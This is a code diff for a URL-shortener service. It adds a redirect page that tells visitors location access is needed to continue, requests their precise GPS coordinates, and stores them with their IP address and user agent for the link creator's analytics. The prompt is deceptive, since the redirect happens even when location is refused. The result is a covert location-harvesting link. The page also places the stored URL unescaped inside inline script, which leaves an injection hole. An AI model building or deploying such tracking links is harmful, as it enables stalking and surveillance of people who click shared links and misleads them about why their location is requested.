@@ -54,6 +54,7 @@ const linkSchema = new mongoose.Schema({
         timezone: String,
       },
       geo: Object,
+      exactLocation: Object,
       timestamp: { type: Date, default: Date.now },
     },
   ],
@@ -129,6 +130,7 @@ app.get('/link/:shortCode', async (req, res) => {
   // Redirect to the original URL
   res.redirect('/loc/' + shortCode);
 });
+
 app.get('/loc/:shortCode', async (req, res) => {
   const { shortCode } = req.params;
   const link = await Link.findOne({ shortCode });
@@ -138,36 +140,113 @@ app.get('/loc/:shortCode', async (req, res) => {
   }
 
   res.send(`
-    <script>
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-          const location = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude
-          };
-          
-          try {
-            await fetch('/api/location/${shortCode}', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(location)
-            });
-            window.location.href = '${link.originalUrl}';
-          } catch (err) {
-            console.error('Error saving location:', err);
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Redirecting...</title>
+      <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+        .message { margin: 20px 0; }
+        .loading { display: none; }
+        #countdown { font-weight: bold; }
+      </style>
+    </head>
+    <body>
+      <div class="message">Please allow location access to continue...</div>
+      <div class="loading">Redirecting in <span id="countdown">3</span> seconds...</div>
+      <script>
+        let countdown = 3;
+        const updateCountdown = () => {
+          document.getElementById('countdown').textContent = countdown;
+          if (countdown <= 0) {
             window.location.href = '${link.originalUrl}';
           }
-        }, () => {
+          countdown--;
+        };
+
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const location = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+              };
+              
+              fetch('/api/location/${shortCode}', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(location)
+              }).finally(() => {
+                document.querySelector('.loading').style.display = 'block';
+                document.querySelector('.message').style.display = 'none';
+                setInterval(updateCountdown, 1000);
+              });
+            },
+            (error) => {
+              console.log('Location error:', error.message);
+              window.location.href = '${link.originalUrl}';
+            },
+            {
+              enableHighAccuracy: true,
+              timeout: 5000,
+              maximumAge: 0
+            }
+          );
+        } else {
           window.location.href = '${link.originalUrl}';
-        });
-      } else {
-        window.location.href = '${link.originalUrl}';
-      }
-    </script>
+        }
+      </script>
+    </body>
+    </html>
   `);
 });
+
+// API endpoint to save user's location
+app.post('/api/location/:shortCode', async (req, res) => {
+  try {
+    const { shortCode } = req.params;
+    const link = await Link.findOne({ shortCode });
+
+    if (!link) {
+      return res.status(404).json({ error: 'Link not found' });
+    }
+
+    const { latitude, longitude } = req.body || {};
+    if (!latitude || !longitude) {
+      return res.status(400).json({ error: 'Latitude and longitude are required' });
+    }
+
+    const location = { latitude, longitude };
+    const ip = getIpAddress(req);
+    const geo = geoip.lookup(ip === '::1' ? '127.0.0.1' : ip);
+
+    const clickData = {
+      ipAddress: ip,
+      userAgent: req?.headers?.['user-agent'] || 'Unknown',
+      location: geo
+        ? {
+            country: geo.country || 'Unknown',
+            city: geo.city || 'Unknown',
+            region: geo.region || 'Unknown',
+            timezone: geo.timezone || 'Unknown',
+          }
+        : { country: 'Unknown', city: 'Unknown', region: 'Unknown', timezone: 'Unknown' },
+      geo: geo || {},
+      exactLocation: location,
+      timestamp: new Date()
+    };
+
+    link.clicks.push(clickData);
+    await link.save();
+    res.json({ message: 'Location saved successfully' });
+  } catch (error) {
+    console.error('Error saving location:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 // Route to view analytics for a specific short link
 app.get('/analytics/:shortCode', async (req, res) => {
   const { shortCode } = req.params;
